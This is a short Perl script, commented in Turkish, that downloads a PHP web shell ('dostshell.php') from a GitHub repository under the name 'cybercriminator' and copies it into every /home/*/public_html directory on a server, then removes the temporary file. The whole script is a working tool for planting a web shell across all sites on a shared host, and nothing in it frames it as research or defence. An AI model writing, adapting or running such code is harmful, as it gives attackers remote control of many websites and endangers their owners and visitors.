use strict;
use warnings;
use LWP::Simple;
use File::Copy;
use File::Glob ':glob';

# Dosya URL'si
my $url = 'https://raw.githubusercontent.com/cybercriminator/BaBa/master/dostshell.php';
# Geçici dosya konumu
my $temp_file = '/home/dostshell.php';

# Dosyayı URL'den indir
print "Dosya indiriliyor...\n";
my $status = getstore($url, $temp_file);

if (is_success($status)) {
    print "$url dosyası indirildi -> $temp_file\n";
} else {
    die "Dosya indirilemedi, hata kodu: $status\n";
}

# Hedef dizinlere kopyala
foreach my $target_dir (bsd_glob('/home/*/public_html/')) {
    if (-d $target_dir) {  # Dizin mevcutsa
        eval {
            copy($temp_file, $target_dir) or die "Kopyalama başarısız: $!";
            print "$temp_file kopyalandı -> $target_dir\n";
        };
        if ($@) {
            print "Hata: $target_dir içine kopyalanamadı. $@\n";
        }
    }
}

# Geçici dosyayı sil
unlink $temp_file or warn "$temp_file silinemedi: $!\n";
